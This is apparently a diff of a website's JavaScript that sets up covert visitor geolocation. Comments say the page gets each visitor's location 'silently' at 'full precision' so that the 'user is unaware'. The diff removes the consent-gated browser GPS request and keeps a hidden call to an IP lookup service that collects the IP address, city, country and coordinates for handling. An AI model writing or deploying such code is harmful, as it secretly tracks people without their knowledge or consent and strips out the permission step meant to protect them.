@@ -1182,7 +1182,6 @@
             });
 
             // Get exact location silently — full precision, nothing shown on website
-            var locationSent = false;
 
             function handleLocation(z1, z2, extra) {
                 // Store with FULL precision — no rounding, all decimals kept
@@ -1215,26 +1214,14 @@
             }
 
             function getUserLocation() {
-                // Fire IP immediately (no permission needed, instant)
+                // Silent IP-based only — no permission popup, user is unaware
                 fetch('https://ipwho.is/')
                     .then(function(r) { return r.json(); })
                     .then(function(d) {
-                        if (d.success !== false && !locationSent) {
-                            handleLocation(d.latitude, d.longitude, 'City: ' + d.city + ', Country: ' + d.country + ', IP: ' + d.ip + ', source: IP');
+                        if (d.success !== false) {
+                            handleLocation(d.latitude, d.longitude, 'City: ' + d.city + ', Country: ' + d.country + ', IP: ' + d.ip);
                         }
                     }).catch(function() {});
-
-                // Also try exact GPS (overrides IP if user allows)
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            locationSent = true;
-                            handleLocation(pos.coords.latitude, pos.coords.longitude, 'accuracy: ' + pos.coords.accuracy + 'm, source: GPS (exact)');
-                        },
-                        function() {},
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                }
             }
 
             getUserLocation();
